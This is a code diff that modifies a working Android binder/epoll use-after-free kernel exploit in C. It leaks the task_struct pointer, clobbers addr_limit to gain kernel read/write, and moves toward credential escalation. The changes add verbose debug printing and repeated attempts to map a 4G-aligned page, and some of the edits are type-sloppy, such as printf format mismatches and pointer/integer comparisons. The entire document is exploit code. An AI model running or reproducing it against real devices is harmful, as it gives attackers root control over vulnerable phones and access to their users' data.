@@ -83,11 +83,17 @@ int epfd;
 void *dummy_page_4g_aligned;
 unsigned long current_ptr;
 int binder_fd;
+struct epoll_event event = { 0 };
 
-void leak_task_struct(void)
+unsigned long * leak_task_struct(struct epoll_event** out_epoll_event)
 {
-  struct epoll_event event = { .events = EPOLLIN };
-  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
+  event.events = EPOLLIN;
+  *out_epoll_event = &event;
+  // struct epoll_event event = { .events = EPOLLIN };
+  
+  if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) {
+    err(1, "epoll_add");
+  }
 
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
   memset(iovec_array, 0, sizeof(iovec_array));
@@ -136,9 +142,10 @@ void leak_task_struct(void)
 
   current_ptr = *(unsigned long *)(page_buffer + 0xe8);
   printf("current_ptr == 0x%lx\n", current_ptr);
+  return current_ptr;
 }
 
-void clobber_addr_limit(void)
+void * clobber_addr_limit(void)
 {
   struct epoll_event event = { .events = EPOLLIN };
   if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event)) err(1, "epoll_add");
@@ -189,6 +196,7 @@ void clobber_addr_limit(void)
       (unsigned long)(iovec_array[IOVEC_INDX_FOR_WQ].iov_len +
       iovec_array[IOVEC_INDX_FOR_WQ + 1].iov_len +
       iovec_array[IOVEC_INDX_FOR_WQ + 2].iov_len));
+  return recvmsg_result;
 }
 
 int kernel_rw_pipe[2];
@@ -240,18 +248,124 @@ void escalate()
   unsigned char cred_buf[0xd0] = {0};
   unsigned char taskbuf[0x20] = {0};
 #endif
-
-  dummy_page_4g_aligned = mmap((void*)0x100000000UL, 0x2000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-  if (dummy_page_4g_aligned != (void*)0x100000000UL)
-    err(1, "mmap 4g aligned");
+  dummy_page_4g_aligned = 0;
+  size_t size = 0x2000;
+  if (!dummy_page_4g_aligned) {
+    dummy_page_4g_aligned = mmap(
+        (void*)0x100000000UL, size,
+        PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0
+    );
+    printf(
+      "dummy_page_4g_aligned = 0x%08x\n",
+      dummy_page_4g_aligned
+    );
+    unsigned long long align
+      = ((unsigned long long)
+        (dummy_page_4g_aligned)) & 0x1FFFFFFFFUL;
+    printf(
+      "align = %ul (expect: 0x100000000)\n", align
+    );
+    if (align != (void*)0x100000000UL) {
+      printf(
+        "munmap(dummy_page_4g_aligned) -> %d\n",
+        munmap(dummy_page_4g_aligned, size)
+      );
+      dummy_page_4g_aligned = 0;
+    }
+  }
+  if (!dummy_page_4g_aligned) {
+    dummy_page_4g_aligned = mmap(
+        (void*)0x100000000UL, size,
+        PROT_READ|PROT_WRITE,
+        MAP_PRIVATE, -1, 0
+    );
+    printf(
+      "dummy_page_4g_aligned = 0x%08x\n",
+      dummy_page_4g_aligned
+    );
+    unsigned long long align
+      = ((unsigned long long)
+        dummy_page_4g_aligned) & 0x1FFFFFFFFUL;
+    printf(
+      "align = %ul (expect: 0x100000000)\n", align
+    );
+    if (align != (void*)0x100000000UL) {
+      printf(
+        "munmap(dummy_page_4g_aligned) -> %d\n",
+        munmap(dummy_page_4g_aligned, size)
+      );
+      dummy_page_4g_aligned = 0;
+    }
+  }
+  if (!dummy_page_4g_aligned) {
+    dummy_page_4g_aligned = mmap(
+        (void*)0x100000000UL, size,
+        PROT_READ|PROT_WRITE,
+        MAP_ANONYMOUS, -1, 0
+    );
+    printf(
+      "dummy_page_4g_aligned = 0x%08x\n",
+      dummy_page_4g_aligned
+    );
+    unsigned long long align
+      = ((unsigned long long)
+        dummy_page_4g_aligned) & 0x1FFFFFFFFUL;
+    printf(
+      "align = %ul (expect: 0x100000000)\n", align
+    );
+    if (align != (void*)0x100000000UL) {
+      printf(
+        "munmap(dummy_page_4g_aligned) -> %d\n",
+        munmap(dummy_page_4g_aligned, size)
+      );
+      dummy_page_4g_aligned = 0;
+    }
+  }
+  if (!dummy_page_4g_aligned) {
+    dummy_page_4g_aligned = mmap(
+        (void*)0x100000000UL, size,
+        PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS, -1, 0
+    );
+    printf(
+      "dummy_page_4g_aligned = 0x%08x\n",
+      dummy_page_4g_aligned
+    );
+    unsigned long long align
+      = ((unsigned long long)
+        dummy_page_4g_aligned) & 0x1FFFFFFFFUL;
+    printf(
+      "align = %ul (expect: 0x100000000)\n", align
+    );
+  }
+  
   if (pipe(kernel_rw_pipe)) err(1, "kernel_rw_pipe");
-
+  printf("binder_fd = open(\"/dev/binder\", O_RDONLY)\n");
   binder_fd = open("/dev/binder", O_RDONLY);
+  printf("binder_fd = %d\n", binder_fd);
+  printf("epfd = epoll_create(1000)\n");
   epfd = epoll_create(1000);
-  leak_task_struct();
-  clobber_addr_limit();
-
+  printf("epfd = %d\n", epfd);
+ 
+  printf("leak_task_struct()\n");
+  struct epoll_event* out_epoll_event;
+  unsigned long * cur_ptr;
+  printf(
+    "leak_task_struct() -> 0x%08x\n",
+    (cur_ptr = leak_task_struct(&out_epoll_event))
+  );
+  
+  printf("clobber_addr_limit()\n");
+  printf(
+    "clobber_addr_limit() -> %08x\n",
+    clobber_addr_limit()
+  );
+  
+  printf("setbuf(stdout: 0x%08x, NULL)\n", stdout);
   setbuf(stdout, NULL);
+  printf("setbuf(stdout: 0x%08x, NULL) returned\n", stdout);
+  
   printf("should have stable kernel R/W now :)\n");
 
   unsigned long current_mm = kernel_read_ulong(current_ptr + OFFSET__task_struct__mm);
